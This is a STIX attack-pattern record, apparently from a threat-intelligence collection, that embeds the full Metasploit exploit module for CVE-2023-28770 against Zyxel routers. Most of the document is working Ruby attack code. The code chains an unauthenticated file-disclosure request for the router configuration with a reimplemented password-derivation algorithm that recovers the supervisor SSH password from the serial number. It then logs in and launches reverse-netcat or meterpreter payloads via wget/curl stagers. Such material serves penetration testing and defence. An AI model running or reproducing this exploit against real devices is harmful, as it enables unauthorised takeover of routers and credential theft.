{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--143188bc-4836-4afc-b54b-5b87cb9fa6be",
    "created": "2024-08-14T17:03:58.591645Z",
    "modified": "2024-08-14T17:03:58.59165Z",
    "name": "Zyxel chained RCE using LFI and weak password derivation algorithm",
    "description": " This module exploits multiple vulnerabilities in the `zhttpd` binary (/bin/zhttpd) and `zcmd` binary (/bin/zcmd). It is present on more than 40 Zyxel routers and CPE devices. The remote code execution vulnerability can be exploited by chaining the local file disclosure vulnerability in the zhttpd binary that allows an unauthenticated attacker to read the entire configuration of the router via the vulnerable endpoint `/Export_Log?/data/zcfg_config.json`. With this information disclosure, the attacker can determine if the router is reachable via ssh and use the second vulnerability in the `zcmd` binary to derive the `supervisor` password exploiting a weak implementation of a password derivation algorithm using the device serial number.  After exploitation, an attacker will be able to execute any command as user `supervisor`.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/zyxel_lfi_unauth_ssh_rce.rb",
            "external_id": "zyxel_lfi_unauth_ssh_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-28770"
        },
        {
            "source_name": "reference",
            "url": "https://r.sec-consult.com/zyxsploit"
        },
        {
            "source_name": "reference",
            "url": "https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/"
        },
        {
            "source_name": "reference",
            "url": "https://th0mas.nl/2020/03/26/getting-root-on-a-zyxel-vmg8825-t50-router/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/boginw/zyxel-vmg8825-keygen"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/tPAvkwQgDK/cve-2023-28770"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'socket'\nrequire 'digest/md5'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::SSH\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  attr_accessor :ssh_socket\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Zyxel chained RCE using LFI and weak password derivation algorithm',\n        'Description' => %q{\n          This module exploits multiple vulnerabilities in the `zhttpd` binary (/bin/zhttpd)\n          and `zcmd` binary (/bin/zcmd). It is present on more than 40 Zyxel routers and CPE devices.\n          The remote code execution vulnerability can be exploited by chaining the local file disclosure\n          vulnerability in the zhttpd binary that allows an unauthenticated attacker to read the entire configuration\n          of the router via the vulnerable endpoint `/Export_Log?/data/zcfg_config.json`.\n          With this information disclosure, the attacker can determine if the router is reachable via ssh\n          and use the second vulnerability in the `zcmd` binary to derive the `supervisor` password exploiting\n          a weak implementation of a password derivation algorithm using the device serial number.\n\n          After exploitation, an attacker will be able to execute any command as user `supervisor`.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Author of exploit chain and MSF module contributor\n          'SEC Consult Vulnerability Lab',\n          'Thomas Rinsma',\n          'Bogi Napoleon Wennerstr\u00f8m'\n        ],\n        'References' => [\n          ['CVE', '2023-28770'],\n          ['URL', 'https://r.sec-consult.com/zyxsploit'],\n          ['URL', 'https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/'],\n          ['URL', 'https://th0mas.nl/2020/03/26/getting-root-on-a-zyxel-vmg8825-t50-router/'],\n          ['URL', 'https://github.com/boginw/zyxel-vmg8825-keygen'],\n          ['URL', 'https://attackerkb.com/topics/tPAvkwQgDK/cve-2023-28770']\n        ],\n        'DisclosureDate' => '2022-02-01',\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_MIPSBE],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_netcat'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_MIPSBE],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => ['printf', 'echo', 'bourne', 'wget', 'curl'],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/mipsbe/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Interactive SSH',\n            {\n              'DefaultOptions' => {\n                'PAYLOAD' => 'generic/ssh/interact'\n              },\n              'Payload' => {\n                'Compat' => {\n                  'PayloadType' => 'ssh_interact'\n                }\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 80,\n          'SSL' => false,\n          'SSH_TIMEOUT' => 30,\n          'WfsDelay' => 5\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options(\n      [\n        OptBool.new('STORE_CRED', [false, 'Store credentials into the database.', true])\n      ]\n    )\n    register_advanced_options(\n      [\n        OptInt.new('ConnectTimeout', [ true, 'Maximum number of seconds to establish a TCP connection', 10])\n      ]\n    )\n  end\n\n  # supervisor user password derivation functions (SerialNumMethod2 and 3) for Zyxel routers\n  # based on the reverse engineer analysis of Thomas Rinsma and Bogi Napoleon Wennerstr\u00f8m\n  # https://github.com/boginw/zyxel-vmg8825-keygen\n\n  def double_hash(input, size = 8)\n    # ROUND 1\n    # take the MD5 hash from the serial number SXXXXXXXXXXXX\n    # this returns a hash of 32 char bytes.\n    # read md5 hash per two char bytes, check if first char byte = '0', then make first byte char == second byte char\n    # store two char bytes in round1 and continue with next two char bytes from the hash.\n    md5_str_array = Digest::MD5.hexdigest(input).split(//)\n    round1_str_array = Array.new(32)\n    j = 0\n    until j == 32\n      if md5_str_array[j] == '0'\n        round1_str_array[j] = md5_str_array[j + 1]\n      else\n        round1_str_array[j] = md5_str_array[j]\n      end\n      round1_str_array[j + 1] = md5_str_array[j + 1]\n      j += 2\n    end\n    round1 = round1_str_array.join\n    # ROUND 2\n    # take the MD5 hash from the result of round1\n    # returns a hash of 32 char bytes.\n    # read md5 hash per two char bytes, check if first char byte = '0', then make first byte char == second byte char\n    # store two char bytes in round2 and continue with next two char bytes.\n    md5_str_array = Digest::MD5.hexdigest(round1).split(//)\n    round2_str_array = Array.new(32)\n    j = 0\n    until j == 32\n      if md5_str_array[j] == '0'\n        round2_str_array[j] = md5_str_array[j + 1]\n      else\n        round2_str_array[j] = md5_str_array[j]\n      end\n      round2_str_array[j + 1] = md5_str_array[j + 1]\n      j += 2\n    end\n    # ROUND 3\n    # take the result of round2 and pick the number (size) of char bytes starting with indice [0] and increased by 3\n    # to create the final password hash with defined number (size) of alphanumeric characters and return the final result\n    round3_str_array = Array.new(size)\n    for i in 0..(size - 1) do\n      round3_str_array[i] = round2_str_array[i * 3]\n    end\n    round3 = round3_str_array.join\n    return round3\n  end\n\n  def mod3_key_generator(seed)\n    # key generator function used in the SerialNumMethod3 pasword derivation function\n    round4_array = Array.new(16, 0)\n    found0s = 0\n    found1s = 0\n    found2s = 0\n\n    while (found0s == 0) || (found1s == 0) || (found2s == 0)\n      found0s = 0\n      found1s = 0\n      found2s = 0\n\n      power_of_2 = 1\n      seed += 1\n\n      for i in 0..9 do\n        round4_array[i] = (seed % (power_of_2 * 3) / power_of_2).floor\n        if (round4_array[i] == 1)\n          found1s += 1\n        elsif (round4_array[i]) == 2\n          found2s += 1\n        else\n          found0s += 1\n        end\n        power_of_2 = power_of_2 << 1\n      end\n    end\n    return seed, round4_array\n  end\n\n  def serial_num_method2(serial_number)\n    # SerialNumMethod2 password derivation function\n    pwd = double_hash(serial_number)\n    return pwd\n  end\n\n  def serial_num_method3(serial_number)\n    # SerialNumMethod3 password derivation function\n\n    # constant definitions\n    keystr1_byte_array = 'IO'.bytes.to_a\n    keystr2_byte_array = 'lo'.bytes.to_a\n    keystr3_byte_array = '10'.bytes.to_a\n    valstr_byte_array = '23456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz0123456789ABCDEF'.bytes.to_a\n    offset1 = 0x8\n    offset2 = 0x20\n\n    round3 = double_hash(serial_number, 10)\n    round3.upcase!\n    round3_byte_array = round3.bytes.to_a\n\n    md5_str = Digest::MD5.hexdigest(serial_number)\n    md5_str_array = md5_str.split(//)\n    offset = md5_str_array[2] + md5_str_array[3] + md5_str_array[4] + md5_str_array[5]\n\n    result = mod3_key_generator(offset.to_i(16))\n    offset = result[0]\n    round4 = result[1]\n\n    for i in 0..9 do\n      if round4[i] == 1\n        new_val = (((round3_byte_array[i] % 0x1a) * 0x1000000) >> 0x18) + 'A'.bytes.join.to_i\n        round3_byte_array[i] = new_val\n        for j in 0..1 do\n          next unless (round3_byte_array[i] == keystr1_byte_array[j])\n\n          index = offset1 + ((offset + j) % 0x18)\n          round3_byte_array[i] = valstr_byte_array[index]\n          break\n        end\n      elsif round4[i] == 2\n        new_val = (((round3_byte_array[i] % 0x1a) * 0x1000000) >> 0x18) + 'a'.bytes.join.to_i\n        round3_byte_array[i] = new_val\n        for j in 0..1 do\n          next unless (round3_byte_array[i] == keystr2_byte_array[j])\n\n          index = offset2 + ((offset + j) % 0x18)\n          round3_byte_array[i] = valstr_byte_array[index]\n          break\n        end\n      else\n        new_val = (((round3_byte_array[i] % 10) * 0x1000000) >> 0x18) + '0'.bytes.join.to_i\n        round3_byte_array[i] = new_val\n        for j in 0..1 do\n          next unless (round3_byte_array[i] == keystr3_byte_array[j])\n\n          var = ((offset + j) >> 0x1f) >> 0x1d\n          index = ((offset + j + var) & 7) - var\n          round3_byte_array[i] = valstr_byte_array[index]\n          break\n        end\n      end\n    end\n    pwd = round3_byte_array.pack('C*')\n    return pwd\n  end\n\n  def crack_supervisor_pwd(serial)\n    # crack supervisor password using the device serial number\n    # there are two confirmed hashing functions that can derive the supervisor password from the serial number:\n    # SerialNumMethod2 and SerialNumMethod3\n    # both passwords candidates will be returned as hashes\n\n    hash_pwd = { 'method2' => nil, 'method3' => nil }\n    # SerialNumMethod2\n    hash_pwd['method2'] = serial_num_method2(serial)\n    # SerialNumMethod3\n    hash_pwd['method3'] = serial_num_method3(serial)\n\n    print_status(\"Derived supervisor password using SerialNumMethod2: #{hash_pwd['method2']}\")\n    print_status(\"Derived supervisor password using SerialNumMethod3: #{hash_pwd['method3']}\")\n    return hash_pwd\n  end\n\n  def report_creds(user, pwd)\n    credential_data = {\n      module_fullname: fullname,\n      username: user,\n      private_data: pwd,\n      private_type: :password,\n      workspace_id: myworkspace_id,\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_details)\n\n    cred_res = create_credential_and_login(credential_data)\n    unless cred_res.nil?\n      print_status(\"Credentials for user:#{user} are added to the database.\")\n    end\n  end\n\n  def get_configuration\n    # Get the device configuration by exploiting the LFI vulnerability\n    return send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/Export_Log?/data/zcfg_config.json')\n    })\n  end\n\n  # Initiate the process configuration exception class used in the process_configuration function\n  class ProcessConfigException < StandardError\n    attr_reader :exception_type\n\n    def initialize(msg = 'This is my custom process config exception', exception_type = 'custom')\n      @exception_type = exception_type\n      super(msg)\n    end\n  end\n\n  def process_configuration(res)\n    # Initiate the instance variable config to store the configuration\n    @config = {}\n\n    # Parse the device configuration json file\n    res_json = res.get_json_document\n    if res_json.blank?\n      raise ProcessConfigException.new 'No device configuration file found.', 'ConfigUnknown'\n    end\n\n    # process json output and retrieve information about supervisor user, ssh port and ssh WAN service status\n    # Also grab hardware and software version including the serial number to crack the password of user supervisor\n    @config['hardware'] = res_json.dig('DeviceInfo', 'HardwareVersion')\n    @config['software'] = res_json.dig('DeviceInfo', 'SoftwareVersion')\n    @config['serial'] = res_json.dig('DeviceInfo', 'SerialNumber')\n\n    login_cfg = res_json.dig('X_ZYXEL_LoginCfg', 'LogGp')\n    unless login_cfg.nil?\n      @config['ssh_user'] = login_cfg.select { |l| l['Account']&.select { |a| a['Username'] == 'supervisor' } }.blank? ? nil : 'supervisor'\n    end\n\n    remote_service = res_json.dig('X_ZYXEL_RemoteManagement', 'Service')\n    unless remote_service.nil?\n      service = remote_service.select { |s| s['Name'] == 'SSH' }.first\n      if service&.fetch('Name', nil) == 'SSH'\n        @config['ssh_port'] = service['Port']\n        @config['ssh_wan_access'] = service['Mode']\n        @config['ssh_service_enabled'] = service['Enable']\n      end\n    end\n    print_status(\"Hardware:#{@config['hardware']} Firmware:#{@config['software']} Serial:#{@config['serial']}\")\n\n    # check if all hash key/value pairs are populated and raise exceptions if retrieved config is not vulnerable\n    if @config['serial'].nil? || @config['ssh_user'].nil? || @config['ssh_port'].nil? || @config['ssh_wan_access'].nil? || @config['ssh_service_enabled'].nil?\n      raise ProcessConfigException.new 'Device serial, supervisor user, SSH port, or SSH WAN access/service status not found.', 'ConfigUnknown'\n    end\n\n    # check if ssh service is enabled\n    # if true then check ssh_port is open and ssh service is accessible from the WAN side\n    if @config['ssh_service_enabled']\n      if @config['ssh_wan_access'] == 'LAN_WAN' && check_port(@config['ssh_port'])\n        return\n      else\n        raise ProcessConfigException.new \"WAN access to SSH service is NOT allowed or SSH port #{@config['ssh_port']} is closed. Try exploit from the LAN side.\", 'ConfigUnreachable'\n      end\n    else\n      raise ProcessConfigException.new 'SSH service is NOT available.', 'ConfigNotVulnerable'\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    Timeout.timeout(datastore['WfsDelay']) { ssh_socket.exec!(cmd) }\n  rescue Timeout::Error\n    @timeout = true\n  end\n\n  def do_login(ip, user, pass, ssh_port)\n    # create SSH session and login\n    # if login is successfull, return true else return false. All other errors will trigger an immediate fail\n    opts = ssh_client_defaults.merge({\n      auth_methods: ['password', 'keyboard-interactive'],\n      port: ssh_port,\n      password: pass\n    })\n\n    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    begin\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        self.ssh_socket = Net::SSH.start(ip, user, opts)\n      end\n    rescue Rex::ConnectionError\n      fail_with(Failure::Unreachable, 'Disconnected during negotiation')\n    rescue Net::SSH::Disconnect, ::EOFError\n      fail_with(Failure::Disconnected, 'Timed out during negotiation')\n    rescue Net::SSH::AuthenticationFailed\n      return false\n    rescue Net::SSH::Exception => e\n      fail_with(Failure::Unknown, \"SSH Error: #{e.class} : #{e.message}\")\n    end\n\n    fail_with(Failure::Unknown, 'Failed to start SSH socket') unless ssh_socket\n    return true\n  end\n\n  def check_port(port)\n    # checks network port and return true if open and false if closed.\n    Timeout.timeout(datastore['ConnectTimeout']) do\n      TCPSocket.new(datastore['RHOST'], port).close\n      return true\n    rescue StandardError\n      return false\n    end\n  rescue Timeout::Error\n    return false\n  end\n\n  def check\n    # Initiate the instance variable config to store the configuration\n    # @config = { 'hardware' => nil, 'software' => nil, 'serial' => nil, 'ssh_user' => nil, 'ssh_port' => nil, 'ssh_wan_access' => nil, 'ssh_service_enabled' => nil }\n\n    res = get_configuration\n    return CheckCode::Safe if res.nil? || res.code != 200\n\n    begin\n      process_configuration(res)\n    rescue ProcessConfigException => e\n      case e.exception_type\n      when 'ConfigNotVulnerable', 'ConfigUnreachable'\n        return CheckCode::Safe(e.message)\n      when 'ConfigUnknown'\n        return CheckCode::Unknown(e.message)\n      end\n    end\n    return CheckCode::Vulnerable\n  end\n\n  def exploit\n    # run if AutoCheck is false (@config = nil), otherwise use the information in @config gathered during the check method\n    unless @config\n      res = get_configuration\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.') if res.nil? || res.code != 200\n\n      begin\n        process_configuration(res)\n      rescue ProcessConfigException => e\n        case e.exception_type\n        when 'ConfigNotVulnerable'\n          return fail_with(Failure::NotVulnerable, e.message)\n        when 'ConfigUnreachable'\n          return fail_with(Failure::Unreachable, e.message)\n        when 'ConfigUnknown'\n          return fail_with(Failure::Unknown, e.message)\n        end\n      end\n    end\n\n    # extra checks added to handle ForceExploit true setting\n    if @config['ssh_service_enabled']\n      if @config['ssh_wan_access'] == 'LAN_WAN' && check_port(@config['ssh_port'])\n        print_status(\"SSH service is available and SSH Port #{@config['ssh_port']} is open. Continue to login.\")\n      else\n        fail_with(Failure::Unreachable, 'SSH service is not availabe and/or SSH port is closed.')\n      end\n    else\n      fail_with(Failure::BadConfig, 'SSH service and/or SSH port information is missing.')\n    end\n\n    # derive supervisor password candidates using password derivation method SerialNumMethod2 and SerialNumMethod3\n    if @config['serial'].nil?\n      fail_with(Failure::BadConfig, 'Serial device number is missing to crack the supervisor password.')\n    else\n      supervisor_pwd = crack_supervisor_pwd(@config['serial'])\n    end\n\n    # try supervisor password derived by SerialNumMethod3 first, if it fails then try the password derived by SerialNumMethod2\n    if do_login(datastore['RHOST'], @config['ssh_user'], supervisor_pwd['method3'], @config['ssh_port'])\n      print_status('Authentication with derived supervisor password using Method3 is successful.')\n      report_creds(@config['ssh_user'], supervisor_pwd['method3']) if datastore['STORE_CRED']\n    elsif do_login(datastore['RHOST'], @config['ssh_user'], supervisor_pwd['method2'], @config['ssh_port'])\n      print_status('Authentication with derived supervisor password using Method2 is successful.')\n      report_creds(@config['ssh_user'], supervisor_pwd['method2']) if datastore['STORE_CRED']\n    else\n      fail_with(Failure::NoAccess, 'Both supervisor password derivation methods failed to authenticate.')\n    end\n\n    if target.name == 'Interactive SSH'\n      handler(ssh_socket)\n      return\n    end\n\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      # Don't check the response here since the server won't respond\n      # if the payload is successfully executed.\n      execute_cmdstager(linemax: 500)\n    end\n    @timeout ? ssh_socket.shutdown! : ssh_socket.close\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-02-01",
    "x_mitre_platforms": [
        "linux'"
    ]
}